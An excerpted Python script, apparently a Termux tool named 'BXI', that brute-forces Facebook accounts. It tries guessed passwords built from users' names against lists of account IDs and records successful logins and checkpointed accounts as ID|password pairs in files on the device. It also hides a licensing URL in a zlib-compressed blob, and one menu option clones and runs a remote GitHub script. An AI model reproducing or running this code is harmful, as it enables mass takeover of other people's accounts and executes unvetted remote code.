...
def getKey():
    ...
    return "BXI-"+myid+xp
km=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/(\xca\xcfO3767\xb6\xd4K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd6O\xaa\xc8,\xa9(\xd1\xcb(\xc9\xcd\xb1\xcf\xb55\x04\x00\n \x12[').decode()
def xi():
    global km
    j=getKey()
...
def aprv():
    ...
    if k in r:
        ...
        print("\033[1;92mYour Token is successfully Approved\33[1;37m")
                ...
                os.system("xdg-open https://wa.me/+923180689255?text={k}")
                aprv()
                sys.exit()
                


logo= f'''        88888888ba  8b        d8  88  
        88      "8b  Y8,    ,8P   88  
        88      ,8P   `8b  d8'    88  
        88______8P'     Y88P      88  
        88------8b,     d88b      88  
...
-----------------------------------------------
[*] Author  : Proof Tricker
[*] Github  : Proof-Tricker
[*] Version : 1.0.3
-----------------------------------------------
...
def main():
    os.system('clear')
    print(logo)
    print('\033[1;97m[~] Status : \33[1;32mPremium\33[1;37m')
    linex()
    print('\033[1;97m[01] \033[1;97mFile Cloning')
    print('\033[1;97m[02] \033[1;97mCreate File ')
    print('\033[1;97m[03] \033[1;97mRandom Cloning')
    print('\033[1;97m[04] \033[1;97mSeprate Idz ')
    print('\033[1;97m[05] \033[1;97mDouble Idz Cut From File ')
    print('\033[1;97m[06] \033[1;97mWhatsApp Group (join)')
    print('\033[1;97m[00] \033[1;97mExit ')
    print('\033[1;97m-----------------------------------------------')
    _Jutt___ = input('\033[1;97m[•] \033[1;97mChoose an option : ')
    if _Jutt___ in ('1', '01'):
         crack__file()
    if _Jutt___ in ('02', '2'):
        os.system('clear')
        print(f'[•] \33[1;37mPlease Waiting....')
        os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
        os.system('cd && cd FILE ;python FILE.py'),main()
    if _Jutt___ in ('4', '04'):
        os.system('clear')
        print(logo)
        sep()
...
def crack__file():
        try:
                clear()
                print('[~] \33[1;32m Please Use New Ids File Like 100090 100091\33[1;37m');linex()
                x = ("sex")
                if x == ("sex"):
                                ...
                                print(logo)
                                plist = []
                                print('[~] Choose Best Password for Cracking');linex();print('[1] Auto Password {\33[1;32mVery Slow\33[1;37m}\n[2] Choice Password {\33[1;32mBEST\33[1;37m}\n[3] First Last Firstlast Password Crack {\33[1;32mNormal\33[1;37m}\n[4] Crack With First and Last Name {\33[1;32mSuper Fast\33[1;37m}');linex()
...
def rdn():
    ...
    os.system('clear')
    print(logo)
    print(' Example : 0304 0315 0321 0333 0344 \033[0;97m')
    linex()
    kode = input(' Put Code : ')
    os.system('clear')
    print(logo)
    limit = int(input(' Please Put Cracking Limit Example : 10000\n----------------------------------------------\n[+] Cracking Limit : '))
    ...
    print(' Ids saved in OK-BXI.txt,CP-BXI.txt')
    linex()
    input(' Press Enter to Back')    
    os.system('python BXI.py')
...
def sep():
    ...
    for k in range(limit):
        y += 1
        print('\033[1;32m EXAMPLE [100090],[100091] etc\033[0m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[OK-BXI] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[CP-BXI] '+cid+' | '+ps+'\033[0;97m')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[%s]  OK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        Osman=session.cookies.get_dict().keys()
                        if "c_user" in Osman:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\33[1;32m[OK-BXI] %s | %s'%(ids,pas))
                                open('/sdcard/OK-BXI.txt', 'a').write(ids+'|'+pas+'\n')                                
                                oks.append(ids)
                                
                                break
                        elif 'checkpoint' in Osman:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[CP-BXI] '+ids+' | '+pas+'\033[1;97m')
